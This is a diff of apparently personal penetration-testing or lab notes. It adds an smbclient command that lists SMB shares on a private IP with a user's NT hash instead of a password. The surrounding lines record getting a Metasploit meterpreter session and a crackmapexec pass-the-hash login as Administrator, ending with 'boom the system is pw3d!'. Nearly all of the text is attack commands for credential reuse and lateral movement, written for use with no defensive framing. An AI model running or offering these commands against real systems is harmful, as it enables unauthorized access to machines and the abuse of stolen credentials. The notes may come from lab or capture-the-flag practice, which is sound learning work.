@@ -23,6 +23,9 @@ set target Native\ upload
 exploit
 boom we get meterpreter session
 
+smbclient -L \\\\10.3.20.128\\ -U nancy --pw-nt-hash
+it ask for hash paste the hash
+
 now with 
 crackmapexec smb <ip> -u Administrator -H "<ntlm>hash alone"
 boom the system is pw3d!
